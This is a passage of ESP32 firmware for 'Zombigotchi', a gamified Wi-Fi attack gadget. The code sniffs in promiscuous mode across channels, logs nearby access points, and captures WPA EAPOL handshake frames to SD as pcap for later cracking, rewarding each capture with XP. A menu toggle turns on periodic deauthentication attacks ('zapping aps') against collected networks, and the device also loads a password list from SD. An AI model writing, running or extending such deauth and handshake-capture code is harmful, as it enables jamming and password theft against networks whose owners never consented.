  bool all=true; for(int i=1;i<=13;i++) if(!chSeen[i]){all=false;break;}
  if(all) unlock(achId("sec4"));
}

// ── PACKET HANDLER ───────────────────────────────────
void IRAM_ATTR pkt(void*buf, wifi_promiscuous_pkt_type_t t){
  auto*p=(wifi_promiscuous_pkt_t*)buf;
  uint8_t*d=p->payload; uint16_t len=p->rx_ctrl.sig_len;
  packets++; ltPackets++;
  if(len<24) return;

  uint16_t fc=(d[1]<<8)|d[0];
  uint8_t  ft=(fc>>2)&3;   // frame type: 0=mgmt 1=ctrl 2=data
  uint8_t  fs=(fc>>4)&0xF; // subtype

  // Beacon → collect AP
  if(ft==0 && fs==8){
    uint8_t*bss=d+16;
    for(int i=0;i<nNets;i++) if(!memcmp(nets[i].bssid,bss,6)) return;
    if(nNets<MAXNETS){
      memcpy(nets[nNets].bssid,bss,6); nets[nNets].ch=ch;
      if(len>38 && d[36]==0){
        uint8_t sl=d[37];
        if(sl && sl<=32 && len>(uint16_t)(38+sl)){ memcpy(nets[nNets].ssid,d+38,sl); nets[nNets].ssid[sl]=0; }
        else strcpy(nets[nNets].ssid,"<hidden>");
      } else strcpy(nets[nNets].ssid,"<hidden>");
      nNets++; apsFound=nNets; ltAPs++;
      if(ch>=1&&ch<=13) chSeen[ch]=true;
      // log new network to SD CSV (deferred flag so ISR stays short)
      pendSave=true;
    }
    return;
  }

  // Only care about data frames from here
  if(ft!=2) return;

  // Calculate LLC/payload offset
  // Bit 8 = toDS, bit 9 = fromDS
  bool toDS  =(fc>>8)&1;
  bool fromDS=(fc>>9)&1;
  // 4-address frame (WDS): 30-byte header; normal: 24-byte header
  uint16_t hdrLen = (toDS && fromDS) ? 30 : 24;

  // Check for QoS data (subtype 8): adds 2 extra bytes
  if((fs & 0x8)) hdrLen += 2;

  if(len < hdrLen+8) return;
  uint8_t*llc = d + hdrLen;

  // LLC SNAP header: AA AA 03 00 00 00 then ethertype
  // EAPOL ethertype = 0x88 0x8E
  bool isEapol = false;
  if(llc[0]==0xAA && llc[1]==0xAA && llc[2]==0x03){
    // SNAP — ethertype at offset 6
    if(len >= hdrLen+8 && llc[6]==0x88 && llc[7]==0x8E) isEapol=true;
  } else if(llc[0]==0x88 && llc[1]==0x8E){
    // Direct ethertype (no LLC)
    isEapol=true;
  }

  if(!isEapol) return;

  // Got an EAPOL frame — this IS a handshake frame (any of the 4-way)
  brainz++; sBrainz++; ltBrainz++;
  hitStreak(); gainXP((uint32_t)(100*xpMult));
  if(!pendPcap && len<=sizeof(pcapBuf)){ memcpy(pcapBuf,d,len); pcapLen=len; pendPcap=true; }
  pendSave=true;
}

// ── COSMETICS DRAW ────────────────────────────────────
void drawBorder(){
  if(!eBdr)return; uint8_t s=BDRS[eBdr].s;
  if(s==1){fillRect(0,0,SW,1,FG);fillRect(0,SH-1,SW,1,FG);fillRect(0,0,1,SH,FG);fillRect(SW-1,0,1,SH,FG);}
  else if(s==2){for(int d=0;d<2;d++){fillRect(d,d,SW-d*2,1,FG);fillRect(d,SH-1-d,SW-d*2,1,FG);fillRect(d,d,1,SH-d*2,FG);fillRect(SW-1-d,d,1,SH-d*2,FG);}}
  else if(s==3){fillRect(0,0,SW,1,FG);fillRect(0,SH-1,SW,1,FG);fillRect(0,0,1,SH,FG);fillRect(SW-1,0,1,SH,FG);fillRect(0,0,4,4,FG);fillRect(SW-4,0,4,4,FG);fillRect(0,SH-4,4,4,FG);fillRect(SW-4,SH-4,4,4,FG);}
  else if(s==4){for(int x=0;x<SW;x+=8){fillRect(x,0,5,1,FG);fillRect(x+1,SH-1,5,1,FG);}for(int y=0;y<SH;y+=8){fillRect(0,y,1,5,FG);fillRect(SW-1,y+1,1,5,FG);}}
  else if(s==5){fillRect(0,0,SW,2,FG);fillRect(0,SH-2,SW,2,FG);fillRect(0,0,2,SH,FG);fillRect(SW-2,0,2,SH,FG);for(int x=10;x<SW-10;x+=20)fillRect(x,0,6,5,FG);}
}
void drawBadgeRow(){
  fillRect(0,112,160,14,BG);
  int cnt=0; for(int i=0;i<MXBDG;i++) if(eBdg[i]!=255&&eBdg[i]<NBG) cnt++;
  if(!cnt)return;
  int bx=(160-cnt*28)/2;
  for(int i=0;i<MXBDG;i++){
    if(eBdg[i]==255||eBdg[i]>=NBG)continue;
    txt(bx,113,BDGS[eBdg[i]].icon,FG,BG,1); bx+=28;
  }
}
void drawTitle(int16_t x,int16_t y,uint8_t l){
  const Flr&f=FLRS[eFlr]; char b[32];
  sprintf(b,"%s%s%s",(eFlr&&cunlock(f.lock))?f.pre:"",TITLES[l<=MAXLVL?l:MAXLVL],(eFlr&&cunlock(f.lock))?f.suf:"");
  txt(x,y,b,DIM,BG,1);
}

// ── MAIN SCREEN ──────────────────────────────────────
uint8_t  pm=255,pf=255,pl=255,pch=255,pdth=255;
uint32_t paps=~0u,pup=~0u,pxp=~0u,pbr=~0u,ppkt=~0u,pdc=~0u;
uint8_t  ppw=255;

void drawMain(){
  cls(BG);
  fillRect(0,0,SW,1,FG); fillRect(0,12,SW,1,FG);
  fillRect(0,227,SW,1,FG); fillRect(0,239,SW,1,FG);
  drawBorder();
  pm=pf=pl=pch=pdth=255; paps=pup=pxp=pbr=ppkt=pdc=~0u; ppw=255;
}
void updateMain(){
  char b[48];
  // top bar
  if(ch!=pch||apsFound!=paps){
    fillRect(0,1,160,11,BG); sprintf(b,"ch:%d  aps:%d",ch,(int)apsFound);
    txt(4,3,b,FG,BG,1); pch=ch; paps=apsFound;
  }
  if(uptime!=pup){
    fillRect(160,1,SW-160,11,BG);
    unsigned long s=uptime%60,m=(uptime/60)%60,h2=uptime/3600;
    txt(162,3,sdOK?"SD":"  ",sdOK?FG:DIM,BG,1);
    sprintf(b,"%02lu:%02lu:%02lu",h2,m,s); txt(220,3,b,FG,BG,1); pup=uptime;
  }
  // face
  if(mood!=pm||faceIdx!=pf){
    fillRect(0,13,160,100,BG);
    const char*face=curFace();
    int16_t fx=(160-strlen(face)*24)/2;
    if(eAcc&&cunlock(ACCS[eAcc].lock)){
      if(strlen(ACCS[eAcc].top)>0){int al=strlen(ACCS[eAcc].top)*6;txt((160-al)/2,30,ACCS[eAcc].top,FG,BG,1);}
    }
    txt(fx,40,face,FG,BG,4);
    if(eAcc&&cunlock(ACCS[eAcc].lock)&&strlen(ACCS[eAcc].side)>0)
      txt(fx+5*24+4,48,ACCS[eAcc].side,FG,BG,2);
    int ml=strlen(MNAMES[mood])*6; txt((160-ml)/2,102,MNAMES[mood],FG,BG,1);
    pm=mood; pf=faceIdx; drawBadgeRow();
  }
  fillRect(158,13,2,214,DIM);
  if(lvl!=pl){
    fillRect(162,16,SW-163,40,BG);
    sprintf(b,"lv%d",lvl); txt(165,18,b,FG,BG,3);
    drawTitle(165,44,lvl); pl=lvl;
  }
  if(xp!=pxp||lvl!=pl){
    fillRect(162,56,SW-163,16,BG);
    sprintf(b,"%u/%u",xp,xpNext); txt(165,57,b,DIM,BG,1);
    xpbar(165,66,148,6,xp,xpNext); pxp=xp;
  }
  if(brainz!=pbr){
    fillRect(162,76,SW-163,26,BG);
    txt(165,78,"brainz:",DIM,BG,1);
    sprintf(b,"%u",brainz); txt(165,88,b,FG,BG,2); pbr=brainz;
  }
  if(packets!=ppkt){
    fillRect(162,106,SW-163,20,BG);
    sprintf(b,"pkts:%u",packets); txt(165,108,b,DIM,BG,1); ppkt=packets;
  }
  if(deauth!=(bool)pdth||deauthCnt!=pdc){
    fillRect(162,130,SW-163,30,BG);
    if(deauth){sprintf(b,"zap:%u",deauthCnt);txt(165,132,b,FG,BG,1);}
    pdth=(uint8_t)deauth; pdc=deauthCnt;
  }
  if(streak>1){
    fillRect(162,163,SW-163,14,BG);
    sprintf(b,"x%.1f STK%u",xpMult,(unsigned)streak); txt(165,165,b,FG,BG,1);
  }
  txt(165,205,"hold=menu",DIM,BG,1);
  // bottom bar
  uint8_t epi=pwLoaded?pwIdx:0;
  if(epi!=ppw){
    fillRect(1,228,SW-2,11,BG);
    if(!pwLoaded||epi==0){if(nNets>0)txt(4,230,nets[deauthIdx%nNets].ssid,DIM,BG,1);}
    else{char pb[54];sprintf(pb,"(X) %s",pws[(epi-1)%nPW]);txt(4,230,pb,FG,BG,1);}
    ppw=epi;
  }
}

// ── SCREENS ──────────────────────────────────────────
// Every screen starts by calling inputs_clear() to drain held button/touch.
// Every event loop uses: read input → act → loop. No goto, no drain inside loop.

// Utility: wait for a single tap-then-release or button-press-then-release
// Returns after input event OR after timeoutMs (0=forever).
void waitAny(uint32_t timeoutMs=0){
  uint32_t t0=millis();
  while(true){
    if(digitalRead(PIN_BTN)==LOW){while(digitalRead(PIN_BTN)==LOW)delay(10);return;}
    if(timeoutMs&&millis()-t0>timeoutMs)return;
    delay(20); yield();
  }
}

void showAchPopup(uint8_t i){
  Ach&a=ACHS[i];
  for(int f=0;f<3;f++){cls(FG);delay(60);cls(BG);delay(60);}
  fillRect(0,0,SW,3,FG);fillRect(0,237,SW,3,FG);fillRect(0,0,3,SH,FG);fillRect(317,0,3,SH,FG);
  txt(130,14,"(^Y^)",FG,BG,3);
  txt(30,60,"ACHIEVEMENT UNLOCKED",FG,BG,2);
  fillRect(10,82,SW-20,2,FG);
  int tl=strlen(a.title)*18; txt((SW-tl)/2,90,a.title,FG,BG,3);
  fillRect(10,128,SW-20,1,DIM);
  int dl=strlen(a.desc)*6; txt((SW-dl)/2,136,a.desc,DIM,BG,1);
  fillRect(10,158,SW-20,1,DIM);
  txt(50,164,"REWARD:",FG,BG,1);
  int rl=strlen(a.reward)*6; txt((SW-rl)/2,176,a.reward,FG,BG,1);
  fillRect(10,200,SW-20,1,DIM);
  txt(60,208,"press btn to continue",DIM,BG,1);
  waitAny(6000);
}

void showLevelUp(){
  inputs_clear();
  cls(BG);
  for(int f=0;f<4;f++){cls(FG);delay(80);cls(BG);delay(80);}
  txt(60,30,"LEVEL UP!",FG,BG,4);
  char b[16]; sprintf(b,"LEVEL %d",lvl); txt(80,100,b,FG,BG,3);
  drawTitle(80,140,lvl);
  txt(70,185,"press to continue",DIM,BG,1);
  waitAny(8000);
  drawMain();
}

void showStats(){
  inputs_clear();
  cls(BG); fillRect(0,0,SW,20,FG);
  txt(72,6,"ZOMBIGOTCHI STATS",BG,FG,1); fillRect(0,20,SW,1,FG);
  char b[48]; int y=28;
  auto row=[&](const char*L,const char*V){txt(8,y,L,DIM,BG,1);txt(150,y,V,FG,BG,1);y+=14;};
  sprintf(b,"lv%d  %s",lvl,TITLES[lvl<=MAXLVL?lvl:MAXLVL]); row("level:",b);
  sprintf(b,"%u/%u",xp,xpNext); row("xp:",b);
  sprintf(b,"%u",brainz); row("session brainz:",b);
  sprintf(b,"%u",ltBrainz); row("lifetime brainz:",b);
  sprintf(b,"%u",bestBrainz); row("best session:",b);
  sprintf(b,"%u",ltSessions); row("sessions:",b);
  sprintf(b,"%u",ltPackets); row("packets:",b);
  sprintf(b,"%u",ltAPs); row("total aps:",b);
  unsigned long s=uptime%60,m=(uptime/60)%60,h=uptime/3600;
  sprintf(b,"%02lu:%02lu:%02lu",h,m,s); row("uptime:",b);
  sprintf(b,"x%.1f  stk:%u",xpMult,(unsigned)streak); row("xp mult:",b);
  if(sdOK){sprintf(b,"s%04u.pcap",(unsigned)sessNum);row("pcap:",b);}
  else row("sd:","not found");
  fillRect(0,231,SW,1,FG); txt(4,234,"press btn to close",DIM,BG,1);
  waitAny(15000);
}

void showAchs(){
  inputs_clear();
  int scroll=0;
  auto draw=[&](){
    cls(BG); fillRect(0,0,SW,20,FG);
    int u=0; for(int i=0;i<NACH;i++) if(ACHS[i].got) u++;
    char hdr[32]; sprintf(hdr,"achievements %d/%d",u,NACH);
    txt((SW-strlen(hdr)*6)/2,7,hdr,BG,FG,1); fillRect(0,20,SW,1,FG);
    for(int i=0;i<4;i++){
      int idx=scroll+i; if(idx>=NACH)break;
      Ach&a=ACHS[idx]; int y=24+i*52;
      uint16_t fg=a.got?FG:DIM;
      fillRect(0,y,SW,51,BG); fillRect(0,y,SW,1,DIM);
      txt(6,y+4,a.got?"(^)":"(?)",fg,BG,2);
      txt(50,y+4,a.title,fg,BG,1);
      txt(50,y+18,a.desc,DIM,BG,1);
      txt(50,y+32,a.got?a.reward:"???",a.got?FG:DIM,BG,1);
    }
    fillRect(0,232,SW,1,FG);
    char nav[48]; sprintf(nav,"pg%d/%d  short=next  hold=exit",scroll/4+1,(NACH+3)/4);
    txt(4,234,nav,DIM,BG,1);
  };
  draw();
  while(true){
    yield(); delay(30);
    if(digitalRead(PIN_BTN)!=LOW) continue;
    uint32_t t=millis(); while(digitalRead(PIN_BTN)==LOW)delay(10);
    if(millis()-t>=800) break;      // long = exit
    scroll=(scroll+4)%NACH; draw(); // short = next page
  }
}

void showTheme(){
  inputs_clear();
  int sel=themeIdx;
  auto draw=[&](){
    cls(BG); fillRect(0,0,SW,18,FG); txt(70,5,"choose theme",BG,FG,1);
    for(int i=0;i<NTHEMES;i++){
      int c=i%3,r=i/3,x=c*96+4,y=18+r*60;
      uint16_t b2=THEMES[i].bg,f2=THEMES[i].fg;
      fillRect(x,y,92,56,b2);
      uint16_t brd=(i==sel)?FG:DIM;
      fillRect(x,y,92,2,brd);fillRect(x,y+54,92,2,brd);fillRect(x,y,2,56,brd);fillRect(x+90,y,2,56,brd);
      int nl=strlen(THEMES[i].name)*6; txt(x+(92-nl)/2,y+6,THEMES[i].name,f2,b2,1);
      txt(x+(92-30)/2,y+20,"(x_x)",f2,b2,1);
      if(i==(int)themeIdx) txt(x+(92-24)/2,y+36,"*ON*",f2,b2,1);
    }
    fillRect(0,199,SW,1,FG); txt(4,202,"short=next theme  hold=exit",DIM,BG,1);
  };
  draw();
  while(true){
    yield(); delay(30);
    if(digitalRead(PIN_BTN)!=LOW) continue;
    uint32_t t=millis(); while(digitalRead(PIN_BTN)==LOW)delay(10);
    if(millis()-t>=800) break;                           // long = exit
    sel=(sel+1)%NTHEMES; applyTheme(sel); saveAll(); draw(); // short = next theme
  }
}

bool isBdgOn(uint8_t i){for(int j=0;j<MXBDG;j++) if(eBdg[j]==i)return true;return false;}
void togBdg(uint8_t i){
  for(int j=0;j<MXBDG;j++) if(eBdg[j]==i){eBdg[j]=255;saveAll();return;}
  for(int j=0;j<MXBDG;j++) if(eBdg[j]==255){eBdg[j]=i;saveAll();return;}
  eBdg[0]=eBdg[1];eBdg[1]=eBdg[2];eBdg[2]=eBdg[3];eBdg[3]=i;saveAll();
}

// Returns number of items on current tab
int wardrobeTabSize(uint8_t tab){
  if(tab==0) return NBD;
  if(tab==1) return NAC;
  if(tab==2) return NBG;
  return NFL;
}

void drawWardrobeTab(uint8_t tab, uint8_t cur){
  cls(BG);
  // Tab bar
  const char*tn[]={"BORDER","ACCS","BADGES","FLAIR"};
  for(int i=0;i<4;i++){
    int x=i*80;
    if(i==tab){fillRect(x,0,80,16,FG);txt(x+2,5,tn[i],BG,FG,1);}
    else{fillRect(x,0,80,16,BG);fillRect(x,0,1,16,DIM);txt(x+2,5,tn[i],DIM,BG,1);}
  }
  fillRect(0,16,SW,1,FG);

  if(tab==0){  // BORDERS — 6 items, 33px each
    for(int i=0;i<NBD;i++){
      int y=20+i*33; bool u=cunlock(BDRS[i].lock); bool eq=(eBdr==i); bool sel=(cur==i);
      fillRect(0,y,SW,32,sel?C_DKGRN:BG); fillRect(0,y,SW,1,sel?FG:DIM);
      txt(4,y+8,u?BDRS[i].name:"?LOCKED",u?FG:DIM,sel?C_DKGRN:BG,2);
      if(eq)     txt(200,y+10,"<EQUIPPED>",FG,sel?C_DKGRN:BG,1);
      else if(u) txt(240,y+10,"equip",sel?FG:DIM,sel?C_DKGRN:BG,1);
      else       txt(240,y+10,"locked",DIM,sel?C_DKGRN:BG,1);
    }
  } else if(tab==1){  // ACCESSORIES — 8 items, 27px each
    for(int i=0;i<NAC;i++){
      int y=20+i*27; bool u=cunlock(ACCS[i].lock); bool eq=(eAcc==i); bool sel=(cur==i);
      fillRect(0,y,SW,26,sel?C_DKGRN:BG); fillRect(0,y,SW,1,sel?FG:DIM);
      const char*pv=strlen(ACCS[i].top)>0?ACCS[i].top:ACCS[i].side; if(!strlen(pv))pv="--";
      txt(4,y+6,u?pv:"???",u?FG:DIM,sel?C_DKGRN:BG,1);
      txt(52,y+4,ACCS[i].name,u?FG:DIM,sel?C_DKGRN:BG,2);
      if(eq)     txt(220,y+8,"<ON>",FG,sel?C_DKGRN:BG,1);
      else if(u) txt(250,y+8,"equip",sel?FG:DIM,sel?C_DKGRN:BG,1);
      else       txt(250,y+8,"lock",DIM,sel?C_DKGRN:BG,1);
    }
  } else if(tab==2){  // BADGES
    // Equipped row
    txt(4,20,"EQUIPPED SLOTS:",DIM,BG,1);
    for(int i=0;i<MXBDG;i++){
      int bx=90+i*26;
      if(eBdg[i]<NBG) txt(bx,18,BDGS[eBdg[i]].icon,FG,BG,2);
      else{ fillRect(bx,18,20,14,BG); fillRect(bx,18,20,1,DIM); fillRect(bx,31,20,1,DIM); }
    }
    fillRect(0,36,SW,1,DIM);
    // Badge grid: 5 cols x 3 rows (but we have 12, cursor moves 0-11)
    for(int i=0;i<NBG;i++){
      int col=i%5, row=i/5, x=4+col*62, y=40+row*46;
      bool u=cunlock(BDGS[i].lock); bool eq=isBdgOn(i); bool sel=(cur==i);
      fillRect(x,y,58,42,sel?C_DKGRN:BG);
      uint16_t brd=sel?FG:(eq?FG:DIM);
      fillRect(x,y,58,1,brd);fillRect(x,y+41,58,1,brd);
      fillRect(x,y,1,42,brd);fillRect(x+57,y,1,42,brd);
      txt(x+14,y+4,u?BDGS[i].icon:"???",u?FG:DIM,sel?C_DKGRN:BG,2);
      int nl=strlen(BDGS[i].name)*6; txt(x+(58-nl)/2,y+26,BDGS[i].name,eq?FG:DIM,sel?C_DKGRN:BG,1);
    }
  } else {  // FLAIR — 6 items
    txt(4,22,"TITLE FLAIR",FG,BG,2); fillRect(0,42,SW,1,DIM);
    for(int i=0;i<NFL;i++){
      int y=46+i*28; bool u=cunlock(FLRS[i].lock); bool eq=(eFlr==i); bool sel=(cur==i);
      char pv[32]; sprintf(pv,"%s%s%s",FLRS[i].pre,"Brain Eater",FLRS[i].suf);
      fillRect(0,y,SW,27,sel?C_DKGRN:BG); fillRect(0,y,SW,1,sel?FG:DIM);
      txt(4,y+6,u?pv:"???LOCKED",u?FG:DIM,sel?C_DKGRN:BG,1);
      if(eq)     txt(250,y+6,"<ON>",FG,sel?C_DKGRN:BG,1);
      else if(u) txt(260,y+6,"equip",sel?FG:DIM,sel?C_DKGRN:BG,1);
      else       txt(260,y+6,"lock",DIM,sel?C_DKGRN:BG,1);
    }
  }
  fillRect(0,231,SW,1,FG);
  txt(4,234,"short=next  hold=equip  2s=tab  3s=exit",DIM,BG,1);
}

void showWardrobe(){
  inputs_clear();
  uint8_t tab=0, cur=0;
  drawWardrobeTab(tab, cur);

  while(true){
    yield(); delay(40);
    if(digitalRead(PIN_BTN)!=LOW) continue;

    uint32_t t=millis();
    while(digitalRead(PIN_BTN)==LOW) delay(10);
    uint32_t held=millis()-t;

    if(held < 30) continue;  // noise

    if(held < 600){
      // Short press — move cursor to next item
      cur=(cur+1) % wardrobeTabSize(tab);
      drawWardrobeTab(tab,cur);

    } else if(held < 1500){
      // Medium hold — EQUIP/TOGGLE the selected item
      if(tab==0){
        if(cunlock(BDRS[cur].lock)){ eBdr=cur; saveAll(); }
      } else if(tab==1){
        if(cunlock(ACCS[cur].lock)){ eAcc=(eAcc==cur)?0:cur; saveAll(); }
      } else if(tab==2){
        if(cunlock(BDGS[cur].lock)){ togBdg(cur); }
      } else {
        if(cunlock(FLRS[cur].lock)){ eFlr=cur; saveAll(); }
      }
      drawWardrobeTab(tab,cur);

    } else if(held < 2500){
      // Long hold (1.5-2.5s) — next tab
      tab=(tab+1)%4; cur=0;
      drawWardrobeTab(tab,cur);

    } else {
      // Very long hold (2.5s+) — exit
      break;
    }

    // Brief cooldown so a single press doesn't fire twice
    delay(150);
  }
}

// ── MENU ─────────────────────────────────────────────
// 4 rows per page, last row is always EXIT on P0 or BACK on others
// P0: DEAUTH | STATS | MORE --> | EXIT
// P1: ACHIEVE | WARDROBE | SETTINGS --> | BACK
// P2: THEME | RELOAD PWS | BACK | --

#define NROWS  4
#define MRH    50
#define MRY(i) (22+(i)*MRH)

void drawMenuPage(uint8_t pg, uint8_t sel){
  cls(BG);
  fillRect(0,0,SW,20,FG);
  char hdr[24]; sprintf(hdr,"menu  pg%d/3",pg+1);
  txt((SW-strlen(hdr)*6)/2,7,hdr,BG,FG,1);
  fillRect(0,20,SW,1,FG);

  // Labels  [page][row]
  const char* L[3][NROWS]={
    {"DEAUTH",       "STATS",       "MORE -->",      "EXIT"     },
    {"ACHIEVEMENTS", "WARDROBE",    "SETTINGS -->",  "<-- BACK" },
    {"THEME",        "RELOAD PWS",  "<-- BACK",      ""         },
  };

  char sub[NROWS][40];
  if(pg==0){
    sprintf(sub[0], deauth?"ON  zapping aps":"OFF enable deauth");
    sprintf(sub[1], "xp brainz networks sd");
    sprintf(sub[2], "achievements wardrobe");
    sprintf(sub[3], "return to main screen");
  } else if(pg==1){
    int u=0; for(int i=0;i<NACH;i++) if(ACHS[i].got) u++;
    sprintf(sub[0], "%d/%d unlocked",u,NACH);
    sprintf(sub[1], "badges borders accessories");
    sprintf(sub[2], "theme reload-pw");
    sprintf(sub[3], "return to page 1");
  } else {
    sprintf(sub[0], "color: %s",THEMES[themeIdx].name);
    sprintf(sub[1], pwLoaded?"%u passwords loaded":"load from sd passwords.txt",nPW);
    sprintf(sub[2], "return to page 2");
    sprintf(sub[3], "");
  }

  int nRows = (pg==2) ? 3 : NROWS;
  for(int i=0;i<nRows;i++){
    int y=MRY(i);
    if(i==sel){
      fillRect(0,y,SW,MRH,FG);
      txt(12,y+8, L[pg][i], BG,FG,2);
      txt(12,y+32,sub[i],   BG,FG,1);
    } else {
      fillRect(0,y,SW,MRH,BG);
      fillRect(0,y,SW,1,DIM);
      txt(12,y+8, L[pg][i], FG,BG,2);
      txt(12,y+32,sub[i],   DIM,BG,1);
    }
  }
  fillRect(0,222,SW,1,FG);
  txt(4,225,"short=cycle  hold=open",DIM,BG,1);
}

void showMenu(){
  inputs_clear();

  uint8_t pg=0, sel=0;
  drawMenuPage(pg,sel);

  while(true){
    yield(); delay(40);

    if(digitalRead(PIN_BTN)!=LOW) continue;
    uint32_t t=millis();
    while(digitalRead(PIN_BTN)==LOW) delay(10);
    uint32_t held=millis()-t;
    if(held<30) continue; // noise

    int nRows=(pg==2)?3:NROWS;

    if(held<800){
      // Short press = cycle selection
      sel=(sel+1)%nRows; drawMenuPage(pg,sel); continue;
    }

    // Long hold = activate
    if(pg==0){
      if(sel==0){ deauth=!deauth; if(!deauth)deauthCnt=0; drawMenuPage(pg,sel); }
      else if(sel==1){ showStats();    drawMenuPage(pg,sel); }
      else if(sel==2){ pg=1; sel=0;   drawMenuPage(pg,sel); }
      else            { break; }  // EXIT → back to main screen
    } else if(pg==1){
      if(sel==0)      { showAchs();    drawMenuPage(pg,sel); }
      else if(sel==1) { showWardrobe();drawMenuPage(pg,sel); }
      else if(sel==2) { pg=2; sel=0;  drawMenuPage(pg,sel); }
      else            { pg=0; sel=3;  drawMenuPage(pg,sel); }  // BACK
    } else {
      if(sel==0)      { showTheme();   drawMenuPage(pg,sel); }
      else if(sel==1) { nPW=0; pwLoaded=false; pwIdx=0; ppw=255; loadPasswords(); drawMenuPage(pg,sel); }
      else            { pg=1; sel=2;  drawMenuPage(pg,sel); }  // BACK
    }
    {uint32_t tc=millis(); while(millis()-tc<350){yield();delay(20);}}
  }

  drawMain();
}

// ── SETUP ────────────────────────────────────────────
void setup(){
  Serial.begin(115200);
  pinMode(PIN_BTN,   INPUT_PULLUP);
  pinMode(PIN_TOUCH, OUTPUT); digitalWrite(PIN_TOUCH, HIGH);
  pinMode(PIN_SD,    OUTPUT); digitalWrite(PIN_SD,    HIGH);

  tft_init();
  cls(C_BLACK);
  txt(60, 80,"ZOMBIGOTCHI",C_GREEN,C_BLACK,3);
  txt(90,120,"(x_x)",      C_GREEN,C_BLACK,4);
  txt(70,180,"booting...", C_DKGRN,C_BLACK,1);
  delay(600);

  loadAll();
  initSD();

  WiFi.mode(WIFI_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&pkt);
  esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE);

  loadPasswords();
  saveAll();
  drawMain();
}

// ── LOOP ─────────────────────────────────────────────
unsigned long lastDisp=0,lastMoodTick=0;
uint32_t btnHeld=0; bool btnFired=false;

void loop(){
  uptime=millis()/1000;

  // streak decay
  if(streak>0&&lastBrainzT>0&&millis()-lastBrainzT>STREAK_TIMEOUT){
    streak=0; xpMult=1.0f;
  }

  // button long-press → menu
  if(digitalRead(PIN_BTN)==LOW){
    if(!btnHeld) btnHeld=millis();
    if(!btnFired&&millis()-btnHeld>1500){btnFired=true; showMenu();}
  } else { btnHeld=0; btnFired=false; }

  // level up
  if(lvlPending){lvlPending=false;saveAll();showLevelUp();return;}

  // achievement popups
  if(achQH!=achQT){
    showAchPopup(achQ[achQH]); achQH=(achQH+1)%5;
    drawMain(); return;
  }

  // deferred pcap write
  if(pendPcap){pendPcap=false;writePcap(pcapBuf,pcapLen);}

  // save + check achievements
  if(pendSave){
    pendSave=false;
    if(sBrainz>bestBrainz) bestBrainz=sBrainz;
    checkAchs(); saveAll();
    writeSessionStats();
    // log any new networks not yet written to CSV
    static int lastLoggedNet=0;
    while(lastLoggedNet < nNets){ logNetCSV(lastLoggedNet); lastLoggedNet++; }
  }

  // pw cycle
  if(pwLoaded&&millis()-lastPwFlip>4000){lastPwFlip=millis();pwIdx=(pwIdx+1)%(nPW+1);ppw=255;}

  // channel hop
  if(millis()-lastHop>1000){
    lastHop=millis(); ch=ch%13+1;
    esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE);
  }

  // face rotate
  if(millis()-lastFace>3000){
    lastFace=millis(); faceIdx=(faceIdx+1)%NFACES;
  }
  if(millis()-lastMoodTick>5000){
    lastMoodTick=millis();
    uint8_t nm;
    if(brainz>0&&random(100)<30) nm=MOOD_FEAST;
    else if(random(100)<20)      nm=MOOD_SHAMBLE;
    else                         nm=MOOD_HUNT;
    mood=nm;
  }

  // deauth — fire every 2s, skip if we just hopped channels
  if(deauth && nNets>0 && millis()-lastDeauth>2000){
    lastDeauth=millis();
    sendDeauth(nets[deauthIdx].bssid, nets[deauthIdx].ch);
    deauthIdx=(deauthIdx+1)%nNets;
  }

  // display
  if(millis()-lastDisp>1000){lastDisp=millis();updateMain();}

  delay(30); yield();
}
